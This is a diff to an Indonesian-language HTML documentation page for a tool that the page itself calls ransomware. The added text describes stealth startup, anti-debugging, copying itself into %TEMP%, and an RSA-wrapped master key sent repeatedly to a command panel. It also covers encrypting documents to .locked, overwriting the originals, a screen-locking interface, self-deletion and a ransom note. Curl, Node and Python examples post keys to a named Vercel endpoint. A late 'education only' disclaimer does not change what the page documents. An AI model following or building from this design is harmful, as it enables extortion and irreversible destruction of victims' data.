@@ -27,6 +27,9 @@
         <a href="#doc-api" onclick="scrollToDoc(event, 'doc-api')" class="doc-nav-link flex items-center gap-3 px-3 py-2.5 text-[0.85rem] text-muted hover:text-[#f0ede6] hover:bg-[#161616] border border-transparent hover:border-[#2a2a2a] rounded-lg transition-all">
           <span class="w-1.5 h-1.5 rounded-full bg-[#4ade80] shadow-[0_0_8px_var(--tw-shadow-color)] shadow-[#4ade80]"></span> API & Deployment
         </a>
+        <a href="#doc-legal" onclick="scrollToDoc(event, 'doc-legal')" class="doc-nav-link flex items-center gap-3 px-3 py-2.5 text-[0.85rem] text-muted hover:text-[#f0ede6] hover:bg-[#161616] border border-transparent hover:border-[#2a2a2a] rounded-lg transition-all">
+          <span class="w-1.5 h-1.5 rounded-full bg-danger shadow-[0_0_8px_var(--tw-shadow-color)] shadow-danger"></span> Legal Compliance
+        </a>
       </nav>
     </div>
   </aside>
@@ -79,24 +82,24 @@
           <h2 class="text-3xl font-serif text-[#f0ede6]">Core Features</h2>
         </div>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-          <div class="bg-[#111] border border-[#222] p-8 rounded-2xl hover:border-[#333] transition-colors">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          <div class="bg-[#111] border border-[#222] p-6 lg:p-8 rounded-2xl hover:border-[#333] transition-colors break-words">
             <h3 class="font-mono text-[0.85rem] text-accent2 uppercase tracking-widest mb-4">Encryption Engine</h3>
             <ul class="space-y-3">
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-accent2 mt-1">▹</span> <b>Cipher:</b> AES-256-GCM (NIST-approved AEAD)</li>
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-accent2 mt-1">▹</span> <b>Auth:</b> 128-bit GCM tag untuk integritas data</li>
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-accent2 mt-1">▹</span> <b>Key Size:</b> 256-bit master key + PBKDF derived keys</li>
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-accent2 mt-1">▹</span> <b>IV:</b> 96-bit random per-file</li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-accent2 mt-1 flex-shrink-0">▹</span> <span><b>Cipher:</b> AES-256-GCM (NIST-approved AEAD)</span></li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-accent2 mt-1 flex-shrink-0">▹</span> <span><b>Auth:</b> 128-bit GCM tag untuk integritas data</span></li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-accent2 mt-1 flex-shrink-0">▹</span> <span><b>Key Size:</b> 256-bit master key + PBKDF derived keys</span></li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-accent2 mt-1 flex-shrink-0">▹</span> <span><b>IV:</b> 96-bit random per-file</span></li>
             </ul>
           </div>
 
-          <div class="bg-[#111] border border-[#222] p-8 rounded-2xl hover:border-[#333] transition-colors">
+          <div class="bg-[#111] border border-[#222] p-6 lg:p-8 rounded-2xl hover:border-[#333] transition-colors break-words">
             <h3 class="font-mono text-[0.85rem] text-[#f5a623] uppercase tracking-widest mb-4">Key Derivation</h3>
             <ul class="space-y-3">
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-[#f5a623] mt-1">▹</span> <b>Algorithm:</b> Argon2id (Memory-hard, timing-resistant)</li>
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-[#f5a623] mt-1">▹</span> <b>Time Cost:</b> 5 iterations untuk mencegah brute-force</li>
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-[#f5a623] mt-1">▹</span> <b>Memory:</b> 256 MB per operation mencegah rainbow tables</li>
-              <li class="flex items-start gap-3 text-[0.9rem] text-muted"><span class="text-[#f5a623] mt-1">▹</span> <b>Salt:</b> 256-bit random, unik per master key</li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-[#f5a623] mt-1 flex-shrink-0">▹</span> <span><b>Algorithm:</b> Argon2id (Memory-hard, timing-resistant)</span></li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-[#f5a623] mt-1 flex-shrink-0">▹</span> <span><b>Time Cost:</b> 5 iterations untuk mencegah brute-force</span></li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-[#f5a623] mt-1 flex-shrink-0">▹</span> <span><b>Memory:</b> 256 MB per op mencegah rainbow tables</span></li>
+              <li class="flex items-start gap-3 text-[0.85rem] lg:text-[0.9rem] text-muted leading-relaxed"><span class="text-[#f5a623] mt-1 flex-shrink-0">▹</span> <span><b>Salt:</b> 256-bit random, unik per master key</span></li>
             </ul>
           </div>
         </div>
@@ -185,19 +188,25 @@
            <div class="relative">
              <div class="absolute -left-[35px] sm:-left-[43px] top-0.5 w-6 h-6 rounded-full bg-[#0a0a0d] border-2 border-[#fcd34d] flex items-center justify-center text-[0.6rem] font-bold text-[#fcd34d] shadow-[0_0_10px_rgba(252,211,77,0.3)]">1</div>
              <h4 class="text-[#f0ede6] font-mono text-[0.85rem] uppercase tracking-widest mb-2">Startup & Anti-Debug</h4>
-             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">Mendeteksi aktivitas *debugger OS* (IsDebuggerPresent/ptrace). Jika terdeteksi, operasi digugurkan. Membuat salinan <i>hash morphing</i> di direktori temporer.</p>
+             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">
+               Saat mesin BitLocker dieksekusi oleh <i>User</i>, aplikasi pertama kali berjalan di latar belakang tanpa jendela (*stealth boot*). Sistem memindai proses OS untuk mendeteksi *Debugger* atau alat forensik RAM (memanggil API `IsDebuggerPresent`). Jika aman, ia menggandakan dirinya sebagai berkas acak (<i>Hash Morphing</i>) ke folder `%TEMP%` untuk menyembunyikan identitas aslinya.
+             </p>
            </div>
            <!-- Step 2 -->
            <div class="relative">
              <div class="absolute -left-[35px] sm:-left-[43px] top-0.5 w-6 h-6 rounded-full bg-[#0a0a0d] border-2 border-[#fcd34d] flex items-center justify-center text-[0.6rem] font-bold text-[#fcd34d] shadow-[0_0_10px_rgba(252,211,77,0.3)]">2</div>
              <h4 class="text-[#f0ede6] font-mono text-[0.85rem] uppercase tracking-widest mb-2">Key Generation & Exfiltration</h4>
-             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">Membangkitkan 512-bit Recovery Key secara acak. Sistem memicu *Send Thread* asinkron untuk mentransmisikan kunci dan Device ID ke Command Center via antarmuka API.</p>
+             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">
+               Sistem menciptakan <b>512-bit Master Key</b> primer. Kunci primer ini disandikan ulang menggunakan RSA *Public Key* (sehingga hanya bisa dibuka oleh kunci privat dari pembuat *ransomware*). Selanjutnya, sebuah *Send Thread* asinkron mulai berjalan mencoba mengirim <code>device_id</code> dan <code>encrypted_key</code> ke panel kontrol (Vercel API Anda) lewat lalu-lintas <i>HTTPS multipart</i> atau JSON secara terus-menerus hingga berhasil (*Retry Loop*).
+             </p>
            </div>
            <!-- Step 3 -->
            <div class="relative">
              <div class="absolute -left-[35px] sm:-left-[43px] top-0.5 w-6 h-6 rounded-full bg-[#0a0a0d] border-2 border-[#fcd34d] flex items-center justify-center text-[0.6rem] font-bold text-[#fcd34d] shadow-[0_0_10px_rgba(252,211,77,0.3)]">3</div>
              <h4 class="text-[#f0ede6] font-mono text-[0.85rem] uppercase tracking-widest mb-2">Cryptography execution</h4>
-             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">Proses rekursif membaca struktur direktori target. Mesin enkripsi menggunakan AES-256-GCM pada level *byte sequence*. Berkas lama ditimpa dengan blok *ciphertext* + 96-bit IV, dan diubah ekstensinya.</p>
+             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">
+               GUI horor menyerupai "Terminal Retas" muncul, mengunci akses *Foreground* PC. Di latar belakang, *engine* merayapi direktori (*recursive target*) untuk mencari dokumen eksekutif (docx, xls, pdf, txt, dsb). Tiap berkas dienkripsi bit-demi-bit dengan cipher <code>AES-256-GCM</code> dan digabungkan bersama 96-bit <i>Initialization Vector (IV)</i> agar tiap berkas unik. Ekstensi awal diganti menjadi <code>.locked</code>, dan berkas aslinya ditimpa (*overwrite 3x pass gutmann*) sehingga tidak mungkin dibalikkan menggunakan piranti kembalikan berkas biasa.
+             </p>
            </div>
            <!-- Step 4 -->
            <div class="relative">
@@ -205,7 +214,9 @@
                <svg fill="none" stroke="#0a0a0d" stroke-width="3" viewBox="0 0 24 24" width="12" height="12"><path d="M20 6L9 17l-5-5"/></svg>
              </div>
              <h4 class="text-[#f0ede6] font-mono text-[0.85rem] uppercase tracking-widest mb-2">Cleanup & Self-Destruct</h4>
-             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">Log dan memori lokal disanitasi total `OPENSSL_cleanse`. Master Key dihapus, dan proses agen menghancurkan objek binari referensinya pada akhir sesi (secure suicide).</p>
+             <p class="text-muted text-[0.85rem] leading-relaxed max-w-2xl">
+               Setelah target tuntas dienkripsi, jejak kunci *plaintext* dari memori di RAM dibersihkan paksa lewat instruksi <code>OPENSSL_cleanse()</code> (menjamin ketahanan dari *Cold Boot Attack*). Proses lalu akan menghapus log operasinya dari SSD dan menghancurkan programnya sendiri secara otomatis (*secure suicide*), menyisakan hanya berkas <code>.locked</code> dan instruksi penembusan tebusan untuk <i>User</i> yang terdampak.
+             </p>
            </div>
         </div>
       </section>
@@ -318,41 +329,94 @@
             </div>
             
             <!-- Code Blocks -->
-            <pre id="code-block-curl" class="code-content text-[#a1a1aa] m-0"><span class="text-[#66d4f5]">curl</span> -X POST https://<span class="api-host-placeholder">domain.vercel.app</span>/api/device \
+            <pre id="code-block-curl" class="code-content text-[#a1a1aa] m-0"><span class="text-[#66d4f5]">curl</span> -X POST https://api-supabase-v1.vercel.app/api/device \
   -H <span class="text-[#f5a623]">"x-api-key: YOUR_SECURE_API_KEY"</span> \
-  -H <span class="text-[#f5a623]">"Content-Type: multipart/form-data"</span> \
-  -d <span class="text-[#f5a623]">"device_id=DEVICE-XYZ"</span> \
-  -d <span class="text-[#f5a623]">"status=ok"</span> \
-  -d <span class="text-[#f5a623]">"files_count=1024"</span> \
-  -d <span class="text-[#f5a623]">"encrypted_key=BASE64_KEY_HERE"</span></pre>
+  -H <span class="text-[#f5a623]">"Content-Type: application/json"</span> \
+  -d <span class="text-[#f5a623]">'</span><span class="text-[#ff6b6b]">{</span>
+    <span class="text-[#66d4f5]">"device_id"</span>: <span class="text-[#f5a623]">"DEV-01"</span>,
+    <span class="text-[#66d4f5]">"status"</span>: <span class="text-[#f5a623]">"ok"</span>,
+    <span class="text-[#66d4f5]">"files_count"</span>: <span class="text-[#a855f7]">1024</span>,
+    <span class="text-[#66d4f5]">"version"</span>: <span class="text-[#f5a623]">"v3.0"</span>,
+    <span class="text-[#66d4f5]">"ephemeral_pub"</span>: <span class="text-[#f5a623]">"PUB_KEY_HEX"</span>,
+    <span class="text-[#66d4f5]">"encrypted_key"</span>: <span class="text-[#f5a623]">"BASE64_KEY_HERE"</span>
+  <span class="text-[#ff6b6b]">}</span><span class="text-[#f5a623]">'</span></pre>
 
             <pre id="code-block-node" class="code-content text-[#a1a1aa] m-0 hidden"><span class="text-[#ff6b6b]">const</span> axios = <span class="text-[#4ade80]">require</span>(<span class="text-[#f5a623]">'axios'</span>);
 
-<span class="text-[#ff6b6b]">const</span> data = {
-  device_id: <span class="text-[#f5a623]">'DEVICE-XYZ'</span>,
+<span class="text-[#ff6b6b]">const</span> payload = {
+  device_id: <span class="text-[#f5a623]">'DEV-01'</span>,
   status: <span class="text-[#f5a623]">'ok'</span>,
   files_count: <span class="text-[#a855f7]">1024</span>,
+  version: <span class="text-[#f5a623]">'v3.0'</span>,
+  ephemeral_pub: <span class="text-[#f5a623]">'PUB_KEY_HEX'</span>,
   encrypted_key: <span class="text-[#f5a623]">'BASE64_KEY_HERE'</span>
 };
 
-axios.<span class="text-[#66d4f5]">post</span>(<span class="text-[#f5a623]">'https://<span class="api-host-placeholder">domain.vercel.app</span>/api/device'</span>, data, {
-  headers: { <span class="text-[#f5a623]">'x-api-key'</span>: <span class="text-[#f5a623]">'YOUR_SECURE_API_KEY'</span> }
+axios.<span class="text-[#66d4f5]">post</span>(<span class="text-[#f5a623]">'https://api-supabase-v1.vercel.app/api/device'</span>, payload, {
+  headers: { 
+    <span class="text-[#f5a623]">'x-api-key'</span>: <span class="text-[#f5a623]">'YOUR_SECURE_API_KEY'</span>,
+    <span class="text-[#f5a623]">'Content-Type'</span>: <span class="text-[#f5a623]">'application/json'</span>
+  }
 }).<span class="text-[#66d4f5]">then</span>(res => console.log(res.data));</pre>
 
             <pre id="code-block-py" class="code-content text-[#a1a1aa] m-0 hidden"><span class="text-[#ff6b6b]">import</span> requests
 
 payload = {
-    <span class="text-[#f5a623]">'device_id'</span>: <span class="text-[#f5a623]">'DEVICE-XYZ'</span>,
+    <span class="text-[#f5a623]">'device_id'</span>: <span class="text-[#f5a623]">'DEV-01'</span>,
     <span class="text-[#f5a623]">'status'</span>: <span class="text-[#f5a623]">'ok'</span>,
     <span class="text-[#f5a623]">'files_count'</span>: <span class="text-[#a855f7]">1024</span>,
+    <span class="text-[#f5a623]">'version'</span>: <span class="text-[#f5a623]">'v3.0'</span>,
+    <span class="text-[#f5a623]">'ephemeral_pub'</span>: <span class="text-[#f5a623]">'PUB_KEY_HEX'</span>,
     <span class="text-[#f5a623]">'encrypted_key'</span>: <span class="text-[#f5a623]">'BASE64_KEY_HERE'</span>
 }
 
-headers = { <span class="text-[#f5a623]">'x-api-key'</span>: <span class="text-[#f5a623]">'YOUR_SECURE_API_KEY'</span> }
+headers = { 
+    <span class="text-[#f5a623]">'x-api-key'</span>: <span class="text-[#f5a623]">'YOUR_SECURE_API_KEY'</span>,
+    <span class="text-[#f5a623]">'Content-Type'</span>: <span class="text-[#f5a623]">'application/json'</span>
+}
 
-res = requests.<span class="text-[#66d4f5]">post</span>(<span class="text-[#f5a623]">'https://<span class="api-host-placeholder">domain.vercel.app</span>/api/device'</span>, data=payload, headers=headers)
+res = requests.<span class="text-[#66d4f5]">post</span>(<span class="text-[#f5a623]">'https://api-supabase-v1.vercel.app/api/device'</span>, json=payload, headers=headers)
 <span class="text-[#ff6b6b]">print</span>(res.json())</pre>
           </div>
+        </div>
+      </section>
+
+      <div class="w-full h-px bg-gradient-to-r from-transparent via-[#2a2a2a] to-transparent"></div>
+
+      <!-- LEGAL COMPLIANCE -->
+      <section id="doc-legal" class="scroll-mt-24 space-y-8">
+        <div class="flex items-center gap-4 mb-6">
+          <div class="p-3 bg-surface rounded-xl border border-danger/30 text-danger bg-danger/5">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          </div>
+          <h2 class="text-3xl font-serif text-[#f0ede6]">Legal Warnings</h2>
+        </div>
+        
+        <p class="text-[0.95rem] text-muted leading-relaxed max-w-2xl mb-6 border-l-2 border-danger pl-4 py-1">
+          <b>PENTING:</b> Modul keamanan kriptografi ini tunduk pada hukum internasional dan regulasi domestik. Tanggung jawab penggunaan sepenuhnya ada di tangan pemegang perangkat lunak!
+        </p>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div class="bg-surface border border-border p-6 rounded-xl space-y-3 shadow-lg">
+             <div class="text-danger flex items-center gap-2 mb-2 font-mono text-[0.8rem] tracking-widest uppercase font-bold">
+               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Illegal Activities
+             </div>
+             <p class="text-[0.85rem] text-muted leading-relaxed">Piranti lunak ini <b>bukan</b> alat untuk disalahgunakan (Peretasan/Ransomware/Destruksi Data). Penggunaan untuk ekstorsi atau pelanggaran privasi akan berakibat pada konsekuensi hukum pidana (UU ITE & regulasi global).</p>
+          </div>
+          <div class="bg-surface border border-border p-6 rounded-xl space-y-3 shadow-lg">
+             <div class="text-warn flex items-center gap-2 mb-2 font-mono text-[0.8rem] tracking-widest uppercase font-bold">
+               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg> Limitation of Liability
+             </div>
+             <p class="text-[0.85rem] text-muted leading-relaxed">Perangkat lunak ini disediakan <b>"AS IS"</b>. Tidak ada jaminan atau asuransi pemulihan data. Pengembang (Author) secara tegas terbebas dari tuntutan kerusakan perangkat, hilangnya bisnis, maupun enkripsi yang tak bisa dibalikkan.</p>
+          </div>
+        </div>
+
+        <div class="w-full mt-8 p-5 bg-[#0a0a0d] border border-border rounded-lg inline-flex flex-col gap-2">
+           <h4 class="text-[#f0ede6] text-[0.85rem] font-bold">Intended Scope</h4>
+           <div class="text-[0.8rem] text-muted leading-relaxed flex items-center gap-6">
+              <span class="flex items-center gap-2"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> Penetration Testing & Education</span>
+              <span class="flex items-center gap-2"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> Enterprise Data Compliance Training</span>
+           </div>
         </div>
       </section>
 
@@ -361,7 +425,7 @@ res = requests.<span class="text-[#66d4f5]">post</span>(<span class="text-[#f5a6
 </div>
 
 <script>
-function scrollToDoc(e, id) {
+window.scrollToDoc = function(e, id) {
   e.preventDefault();
   const el = document.getElementById(id);
   const mainScroll = document.getElementById('docs-main-scroll');
@@ -385,29 +449,5 @@ function scrollToDoc(e, id) {
       behavior: 'smooth'
     });
   }
-}
-
-function switchCodeTab(tab) {
-  document.querySelectorAll('.code-req-tab').forEach(t => {
-    t.classList.remove('active', 'text-[#f0ede6]', 'bg-[#1e2a4a]/40');
-    t.classList.add('text-muted');
-  });
-  const t = document.getElementById('tab-code-' + tab);
-  if (t) {
-    t.classList.remove('text-muted');
-    t.classList.add('active', 'text-[#f0ede6]', 'bg-[#1e2a4a]/40');
-  }
-
-  document.querySelectorAll('.code-content').forEach(c => c.classList.add('hidden'));
-  const target = document.getElementById('code-block-' + tab);
-  if (target) target.classList.remove('hidden');
-}
-
-setTimeout(() => {
-  document.querySelectorAll('.api-host-placeholder').forEach(el => {
-    let host = window.location.host;
-    if (!host || host === '') host = 'YOUR-VERCEL-DOMAIN.vercel.app';
-    el.textContent = host;
-  });
-}, 500);
+};
 </script>
